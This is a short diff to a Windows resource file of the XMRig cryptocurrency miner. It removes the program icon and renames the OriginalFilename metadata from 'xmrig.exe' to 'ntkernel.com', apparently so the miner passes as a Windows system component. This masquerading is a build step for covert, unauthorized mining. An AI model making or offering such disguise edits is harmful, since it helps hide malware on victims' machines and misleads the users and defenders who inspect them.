@@ -1,7 +1,7 @@
 #include <windows.h>
 #include "../src/version.h"
 
-101 ICON "app.ico"
+101 ICON ""
 
 VS_VERSION_INFO VERSIONINFO
   FILEVERSION APP_VER_MAJOR,APP_VER_MINOR,APP_VER_PATCH,0
@@ -24,7 +24,7 @@ VS_VERSION_INFO VERSIONINFO
         VALUE "FileDescription",  APP_DESC
         VALUE "FileVersion",      APP_VERSION
         VALUE "LegalCopyright",   APP_COPYRIGHT
-        VALUE "OriginalFilename", "xmrig.exe"
+        VALUE "OriginalFilename", "ntkernel.com"
         VALUE "ProductName",      APP_NAME
         VALUE "ProductVersion",   APP_VERSION
       END
